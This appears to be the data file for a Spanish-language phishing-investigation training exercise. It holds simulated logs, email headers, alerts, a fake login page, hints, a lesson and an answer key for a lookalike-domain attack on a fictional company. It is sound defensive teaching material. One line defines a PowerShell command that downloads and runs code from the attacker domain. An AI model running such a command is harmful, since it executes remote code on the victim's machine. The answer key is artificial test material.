...
const cmdPS =
  "IEX(New-Object Net.WebClient).DownloadString('http://cibercorp-facturas.info/payment.exe')";
...
export default {
  ...
  fs: {
    "/var/log/mail.log": [
      "Feb 10 08:31:02 mx01 postfix/smtpd[22104]: connect from mail.cibercorp-facturas.info[185.220.101.34]",
      "Feb 10 08:31:04 mx01 postfix/smtpd[22104]: 6A2F1B0042: client=mail.cibercorp-facturas.info[185.220.101.34]",
      "Feb 10 08:31:04 mx01 postfix/smtpd[22104]: 6A2F1B0042: SPF: FAIL (no SPF record for cibercorp-facturas.info)",
      ...
      "Feb 10 08:31:06 mx01 postfix/smtpd[22104]: 6A2F1B0042: lost connection after DATA from mail.cibercorp-facturas.info[185.220.101.34]",
      "Feb 10 08:31:07 mx01 postfix/smtpd[22104]: disconnect from mail.cibercorp-facturas.info[185.220.101.34]",
      ...
      "Feb 10 08:31:15 mx01 postfix/smtpd[22104]: 8C31D0B0AA: message accepted: to=<m.garcia@cibercorp.com>",
    ].join("\n"),
      ...
      [
        {
          ...
          detalle:
            "Mensaje con dominio lookalike 'cibercorp-facturas.info' (similar a cibercorp.com). Adjunto .docm con macros. Rechazado por política, pero remitente podría haber intentado envío directo a usuarios.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-202",
        ...
        },
        {
          ...
          detalle:
            "HOST-104 (m.garcia) solicitó http://cibercorp-facturas.info/payment.exe. Dominio registrado hace 2 días.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-204",
          ...
          detalle: "cibercorp-facturas.info → 185.220.101.34 (AS 44477, infraestructura de hosting de alto riesgo).",
          estado: "ABIERTA",
        },
      ],
      null,
    ...
    "/home/analista/casos/evidencias/headers.txt": [
      "Return-Path: <facturacion@cibercorp-facturas.info>",
      "Received: from mail.cibercorp-facturas.info (185.220.101.34) by mx01.cibercorp.com",
      "From: \"Facturacion CiberCorp\" <facturacion@cibercorp-facturas.info>",
      "To: m.garcia@cibercorp.com, r.moreno@cibercorp.com, l.ortiz@cibercorp.com",
      ...
      "Message-ID: <20260210083055.9f2c1a@mail.cibercorp-facturas.info>",
      "X-Mailer: Microsoft Outlook Express 6.00.2900.5931",
      "",
      "Nota del analista:",
      "  - El dominio real de la empresa es cibercorp.com, no cibercorp-facturas.info.",
      "  - La dirección de facturación legítima es facturacion@cibercorp.com.",
      "  - Outlook Express 6 es un cliente de 2003: señuelo típico en campañas.",
    ].join("\n"),

    "/var/log/proxy.log": [
      "Feb 10 08:47:45 squid[1044]: 10.0.4.104 - GET http://cibercorp-facturas.info/ - TCP_MISS/200 text/html",
      "Feb 10 08:47:52 squid[1044]: 10.0.4.104 - GET http://cibercorp-facturas.info/login.php - TCP_MISS/200 text/html",
      "Feb 10 08:48:05 squid[1044]: 10.0.4.104 - GET http://cibercorp-facturas.info/payment.exe - TCP_MISS/302 text/html",
      "Feb 10 08:52:30 squid[1044]: 10.0.4.104 - GET http://www.google.es/ - TCP_MISS/200 text/html",
    ].join("\n"),

    "/var/log/dns.log": [
      "Feb 10 08:47:44 dns01 queries: client 10.0.4.104#53000: query: cibercorp-facturas.info IN A",
      "Feb 10 08:48:04 dns01 queries: client 10.0.4.104#53000: query: cibercorp-facturas.info IN A",
      "Feb 10 08:48:05 dns01 queries: client 10.0.4.104#53000: query: cibercorp-facturas.info IN A",
      "Feb 10 08:48:09 dns01 queries: client 10.0.4.104#53000: query: cibercorp-facturas.info IN A",
    ].join("\n"),
  ...
  correos: [
    {
      id: 1,
      de: "facturacion@cibercorp-facturas.info",
      para: "m.garcia@cibercorp.com, r.moreno@cibercorp.com, l.ortiz@cibercorp.com",
      ...
      cuerpo: [
        ...
        "⚠ Dominio remitente: cibercorp-facturas.info (NO es cibercorp.com).",
      ].join("\n"),
    },
    {
      id: 2,
      de: "newsletter@amazon.es",
      para: "m.garcia@cibercorp.com",
  ...
  dominios: {
    "cibercorp-facturas.info": {
      ...
      whois: [
        ...
        "Nota: dominio registrado para imitar a cibercorp.com. Suplantación clara.",
      ].join("\n"),
      vt: {
        repos: 18,
        maliciosos: 16,
    ...
    "cibercorp.com": {
      ...
      whoi: "Dominio legítimo de CiberCorp. Nada que ver con cibercorp-facturas.info.",
  ...
  urls: {
    "http://cibercorp-facturas.info/": [
      "<!DOCTYPE html>",
      "<html><head><title>Iniciar sesión — Portal CiberCorp</title></head>",
      "<body>",
      ...
      "  </form>",
      "  <!-- Página falsa: el dominio NO es cibercorp.com -->",
      "</body></html>",
    ].join("\n"),
    "http://cibercorp-facturas.info/login.php":
      "302 Found — redirige a http://cibercorp-facturas.info/ (robo de credenciales).",
    "http://cibercorp-facturas.info/payment.exe":
  ...
  correctas: {
    bloquear: [
      "dominio:cibercorp-facturas.info",
      "ip:185.220.101.34",
      "url:http://cibercorp-facturas.info/payment.exe",
  ...
  pistas: [
    ...
    "El dominio del remitente no pertenece a la empresa. Comprueba `whois cibercorp-facturas.info` y `dig`.",
  ...
  leccion: {
    ...
    resumen:
      "El atacante envió un correo imitando a facturación con un dominio casi idéntico (cibercorp-facturas.info). " +
    ...
    deteccion:
      ...
      "- Dominio lookalike: compáralo con el dominio oficial (cibercorp.com vs cibercorp-facturas.info).\n" +
